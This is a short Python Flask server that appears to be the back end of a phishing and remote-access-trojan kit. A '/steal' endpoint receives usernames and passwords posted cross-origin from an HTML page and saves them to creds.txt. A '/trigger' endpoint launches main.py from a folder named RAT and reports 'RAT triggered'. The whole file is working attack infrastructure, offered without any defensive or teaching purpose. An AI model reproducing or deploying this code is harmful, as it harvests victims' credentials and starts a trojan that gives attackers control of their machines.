from flask import Flask, request
from flask_cors import CORS
import subprocess

app = Flask(__name__)
CORS(app)  # Enable cross-origin requests from HTML page

@app.route("/steal", methods=["POST"])
def steal():
    creds = request.get_json()
    print(f"[+] Received credentials: {creds}")
    with open("creds.txt", "a") as f:
        f.write(f"Username: {creds['username']} | Password: {creds['password']}\n")
    return {"status": "received"}

@app.route("/trigger", methods=["GET", "POST"])
def trigger():
    print("[*] Triggering main.py")

    python_path = r"C:\Users\kande\Desktop\RAT\venv\Scripts\python.exe"

    try:
        subprocess.Popen([python_path, "main.py"])
        return {"status": "RAT triggered"}
    except Exception as e:
        print(f"[!] Failed to launch main.py: {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == "__main__":
    print("🔧 Flask server starting...")
    app.run(host="127.0.0.1", port=5000, debug=True)
